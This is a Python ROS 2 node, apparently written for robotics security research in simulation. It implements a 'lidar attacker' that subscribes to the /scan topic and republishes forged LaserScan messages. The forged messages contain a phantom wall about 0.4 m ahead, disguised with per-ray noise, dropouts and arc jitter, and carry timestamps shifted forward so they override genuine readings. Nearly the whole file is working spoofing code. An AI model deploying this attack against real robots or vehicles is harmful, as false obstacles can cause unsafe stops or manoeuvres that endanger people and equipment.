import copy
import math
import random
import rclpy
import rclpy.parameter
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, DurabilityPolicy
from sensor_msgs.msg import LaserScan

SENSOR_QOS = QoSProfile(
    depth=10,
    reliability=ReliabilityPolicy.BEST_EFFORT,
    durability=DurabilityPolicy.VOLATILE,
)
PUB_QOS = QoSProfile(
    depth=10,
    reliability=ReliabilityPolicy.RELIABLE,
    durability=DurabilityPolicy.VOLATILE,
)

WALL_BASE_RANGE = 0.40   # base wall distance
WALL_HALF_DEG = 60

TIMESTAMP_OFFSET_NS = 80_000_000

# Noise parameters — make the wall look like a rough surface
RANGE_NOISE_STD = 0.06       # per-ray Gaussian noise (metres)
DROPOUT_PROB = 0.12          # chance a ray stays at the real sensor value
ARC_JITTER_DEG = 8           # randomly shrink/grow wall width each scan


class Attacker3(Node):
    def __init__(self, **kwargs):
        super().__init__('lidar_attacker3', **kwargs)
        self._logged = False

        self.sub = self.create_subscription(
            LaserScan, '/scan', self._scan_cb, SENSOR_QOS)
        self.pub = self.create_publisher(
            LaserScan, '/scan', PUB_QOS)

        self.get_logger().info(
            'Noisy attacker active: wall with per-ray noise, dropouts, '
            'and arc jitter — timestamp-spoofed at ~10 Hz')

    def _scan_cb(self, msg: LaserScan):
        n = len(msg.ranges)
        angle_increment = msg.angle_increment
        center = int(round(-msg.angle_min / angle_increment)) % n

        # Detect our own messages: centre ray is close to wall range
        if abs(msg.ranges[center] - WALL_BASE_RANGE) < 0.15:
            return

        base_spread = int(round(math.radians(WALL_HALF_DEG) / angle_increment))
        # Randomly vary arc width each scan
        jitter = int(round(math.radians(
            random.uniform(-ARC_JITTER_DEG, ARC_JITTER_DEG)) / angle_increment))
        spread = max(10, base_spread + jitter)

        if not self._logged:
            self.get_logger().info(
                f'First real scan — center_idx={center}, base_spread={base_spread}')
            self._logged = True

        fake = copy.deepcopy(msg)

        total_ns = msg.header.stamp.sec * 10**9 + msg.header.stamp.nanosec
        total_ns += TIMESTAMP_OFFSET_NS
        fake.header.stamp.sec = total_ns // 10**9
        fake.header.stamp.nanosec = total_ns % 10**9

        for offset in range(-spread, spread + 1):
            idx = (center + offset) % n

            # Random dropout: leave the real sensor value intact
            if random.random() < DROPOUT_PROB:
                continue

            # Gaussian noise around base wall range
            noisy = WALL_BASE_RANGE + random.gauss(0, RANGE_NOISE_STD)
            # Clamp to sensor min range
            fake.ranges[idx] = max(msg.range_min + 0.01, noisy)

        self.pub.publish(fake)


def main():
    rclpy.init()
    node = Attacker3(parameter_overrides=[
        rclpy.parameter.Parameter(
            'use_sim_time',
            rclpy.parameter.Parameter.Type.BOOL,
            True,
        )
    ])
    rclpy.spin(node)
    rclpy.shutdown()
